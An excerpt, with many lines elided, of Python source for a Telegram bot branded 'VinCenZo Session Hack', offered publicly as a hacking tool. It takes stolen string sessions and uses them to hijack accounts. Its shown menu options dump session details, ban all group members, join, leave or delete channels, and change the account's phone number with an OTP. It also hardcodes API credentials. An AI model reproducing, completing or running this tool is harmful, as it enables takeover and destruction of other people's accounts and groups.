# COPYRIGHT Â© 2021-22 BY @RealVinCenZo ðŸ”¥
# NOW PUBLIC BY @RealVinCenZo
import os
...
client = TelegramClient('VinCenZoSessionHack_bot', api_id, api_hash).start(bot_token=token)
...
async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 13159090, "4dd704101f160d447ca73f7f9216354a") as X:
    bot = client = X
    try: 
...
channel = "RealVinCenZo"
menu = '''

**Nᴏᴛɪᴄᴇ Jᴏɪɴ @RealVinCenZo**
  ...
  async with bot.conversation(event.chat_id) as x:
    ...
    if res.text == "A":
      ...
      if len(i) > 3855:
        ...
        file.write(i + "\n\nDᴇᴛᴀɪʟs ʙʏ @VinCenZoSessionHack_bot")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nTʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᐯ𝚒𝚗ᑕ𝚎𝚗Z𝚘 SESSIOᑎ ᕼᗩᑕK")
    elif res.text == "B":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Banning all members Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᐯ𝚒𝚗ᑕ𝚎𝚗Z𝚘 SESSIOᑎ ᕼᗩᑕK")
    elif r == "D":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Joined the Channel/Group Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᐯ𝚒𝚗ᑕ𝚎𝚗Z𝚘 SESSIOᑎ ᕼᗩᑕK")
    elif r == "F":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Leaved the Channel/Group Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᐯ𝚒𝚗ᑕ𝚎𝚗Z𝚘 SESSIOᑎ ᕼᗩᑕK")
    elif r == "G":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      await event.reply("Deleted the Channel/Group Tʜᴀɴᴋs ғᴏʀ ᴜsɪɴɢ ᐯ𝚒𝚗ᑕ𝚎𝚗Z𝚘 SESSIOᑎ ᕼᗩᑕK")
    elif r == "H":
      await x.send_message("Gɪᴠᴇ Sᴛʀɪɴɢ Sᴇssɪᴏɴ.")
      strses = await x.get_response()
      op = await cu(strses.text)
      ...
      try:
        ...
        await event.respond("SEND THIS ERROR TO - @VinCenZoSupport\n**LOGS**\n" + str(e))
